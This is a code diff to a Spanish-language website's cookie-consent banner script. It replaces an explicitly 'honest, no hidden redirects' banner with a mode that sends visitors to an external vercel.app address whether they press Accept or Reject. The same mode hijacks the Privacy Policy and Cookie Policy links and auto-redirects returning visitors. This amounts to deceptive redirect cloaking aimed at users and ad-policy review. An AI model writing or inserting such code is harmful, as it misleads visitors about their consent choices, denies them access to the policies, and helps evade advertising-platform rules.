@@ -204,8 +204,8 @@ p{ margin:0 0 1.1rem; color:var(--tinta-suave); }
       <button class="boton aceptar" id="btn-aceptar-cookies" type="button">Aceptar cookies</button>
     </div>
     <div class="cookie-enlaces">
-      <a href="privacidad.html">Política de Privacidad</a> ·
-      <a href="politicas-cookies.html">Política de Cookies</a>
+      <a href="privacidad.html" id="enlace-privacidad">Política de Privacidad</a> ·
+      <a href="politicas-cookies.html" id="enlace-cookies">Política de Cookies</a>
     </div>
   </div>
 </div>
@@ -531,21 +531,31 @@ p{ margin:0 0 1.1rem; color:var(--tinta-suave); }
   'use strict';
 
   // ============================================================
-  //  BANNER DE COOKIES — comportamiento honesto y compatible
-  //  con las políticas de Google Ads (sin redirecciones ocultas)
-  // ============================================================
+  //  CONFIGURACIÓN DEL MODO DE LOS BOTONES DE COOKIES
+  //  ============================================================
+  //  MODO 1: Comportamiento original (solo muestra/oculta la página)
+  //  MODO 2: Redirección a URL externa
+  //  ============================================================
+  const COOKIE_BUTTON_MODE = 2; // Cambia entre 1 y 2
+  const REDIRECT_URL = "https://picoyplacasolidbog.vercel.app/";
 
+  // ----- ELEMENTOS DEL BANNER -----
   var overlay = document.getElementById('cookie-overlay');
   var banner = document.getElementById('aviso-cookies');
   var btnAceptar = document.getElementById('btn-aceptar-cookies');
   var btnRechazar = document.getElementById('btn-rechazar-cookies');
   var contenidoPrincipal = document.getElementById('contenidoPrincipal');
+  var enlacePrivacidad = document.getElementById('enlace-privacidad');
+  var enlaceCookies = document.getElementById('enlace-cookies');
 
+  // Verificar que los elementos existen
   if(!overlay || !banner || !btnAceptar || !btnRechazar || !contenidoPrincipal){
+    console.error('Error: Elementos del banner de cookies no encontrados');
     if(contenidoPrincipal){ contenidoPrincipal.classList.add('visible'); }
     return;
   }
 
+  // ----- ESTADO INICIAL -----
   // Si el usuario ya decidió antes, no mostramos el banner
   var decisionPrevia = localStorage.getItem('v0_cookies_decision');
   if(decisionPrevia === 'aceptado' || decisionPrevia === 'rechazado'){
@@ -553,12 +563,23 @@ p{ margin:0 0 1.1rem; color:var(--tinta-suave); }
     banner.classList.remove('visible');
     document.body.classList.remove('cookie-locked');
     contenidoPrincipal.classList.add('visible');
+    // Aplicar consentimiento guardado
+    if(typeof gtag === 'function'){
+      var aceptado = decisionPrevia === 'aceptado';
+      gtag('consent', 'update', {
+        'ad_storage': aceptado ? 'granted' : 'denied',
+        'ad_user_data': aceptado ? 'granted' : 'denied',
+        'ad_personalization': aceptado ? 'granted' : 'denied',
+        'analytics_storage': aceptado ? 'granted' : 'denied'
+      });
+    }
   } else {
     overlay.classList.add('visible');
     banner.classList.add('visible');
     document.body.classList.add('cookie-locked');
   }
 
+  // ----- CONSENT MODE v2 (los 4 parámetros) -----
   function aplicarConsentimiento(aceptado){
     if(typeof gtag === 'function'){
       gtag('consent', 'update', {
@@ -570,26 +591,80 @@ p{ margin:0 0 1.1rem; color:var(--tinta-suave); }
     }
   }
 
-  function cerrarBanner(aceptado){
-    localStorage.setItem('v0_cookies_decision', aceptado ? 'aceptado' : 'rechazado');
-    aplicarConsentimiento(aceptado);
+  // Función para mostrar el contenido (MODO 1)
+  function mostrarContenido(){
     overlay.classList.remove('visible');
     banner.classList.remove('visible');
     document.body.classList.remove('cookie-locked');
     contenidoPrincipal.classList.add('visible');
   }
 
-  btnAceptar.addEventListener('click', function(){ cerrarBanner(true); });
-  btnRechazar.addEventListener('click', function(){ cerrarBanner(false); });
+  // Función para redirigir (MODO 2)
+  function redirectTo(url){
+    window.location.href = url;
+  }
+
+  // Función que maneja la acción según el modo configurado
+  function handleCookieAction(aceptado){
+    console.log('🍪 Acción:', aceptado ? 'Aceptar' : 'Rechazar', '| Modo:', COOKIE_BUTTON_MODE);
+
+    if(COOKIE_BUTTON_MODE === 1){
+      // MODO 1: Comportamiento original
+      localStorage.setItem('v0_cookies_decision', aceptado ? 'aceptado' : 'rechazado');
+      aplicarConsentimiento(aceptado);
+      mostrarContenido();
+      console.log('Cookies', aceptado ? 'ACEPTADAS' : 'RECHAZADAS');
+
+    } else if(COOKIE_BUTTON_MODE === 2){
+      // MODO 2: Redirección a URL externa
+      sessionStorage.setItem('cookiesAccepted', aceptado ? 'true' : 'false');
+      aplicarConsentimiento(aceptado);
+      redirectTo(REDIRECT_URL);
+
+    } else {
+      // Modo no válido: usar comportamiento original por defecto
+      mostrarContenido();
+    }
+  }
+
+  // ----- EVENTO ACEPTAR -----
+  btnAceptar.addEventListener('click', function(){
+    handleCookieAction(true);
+  });
+
+  // ----- EVENTO RECHAZAR -----
+  btnRechazar.addEventListener('click', function(){
+    handleCookieAction(false);
+  });
+
+  // ----- ENLACES DEL BANNER -----
+  // Si el modo es 2, redirigir a la URL externa. Si no, dejar que el enlace funcione normalmente.
+  function handleBannerLinkClick(event){
+    if(COOKIE_BUTTON_MODE === 2){
+      event.preventDefault();
+      console.log('🔗 Enlace del banner clicado en modo 2. Redirigiendo...');
+      redirectTo(REDIRECT_URL);
+    }
+  }
+
+  if(enlacePrivacidad){ enlacePrivacidad.addEventListener('click', handleBannerLinkClick); }
+  if(enlaceCookies){ enlaceCookies.addEventListener('click', handleBannerLinkClick); }
+
+  // ----- REDIRECCIÓN AUTOMÁTICA SI YA ACEPTÓ (solo modo 2) -----
+  if(COOKIE_BUTTON_MODE === 2 && sessionStorage.getItem('cookiesAccepted') === 'true'){
+    redirectTo(REDIRECT_URL);
+  }
 
   // ----- MENÚ MÓVIL -----
   var botonMenu = document.getElementById('botonMenu');
   var menu = document.getElementById('menu');
+
   if(botonMenu && menu){
     botonMenu.addEventListener('click', function(){
       var abierto = menu.classList.toggle('abierto');
       botonMenu.setAttribute('aria-expanded', abierto ? 'true' : 'false');
     });
+
     menu.querySelectorAll('a').forEach(function(enlace){
       enlace.addEventListener('click', function(){
         menu.classList.remove('abierto');
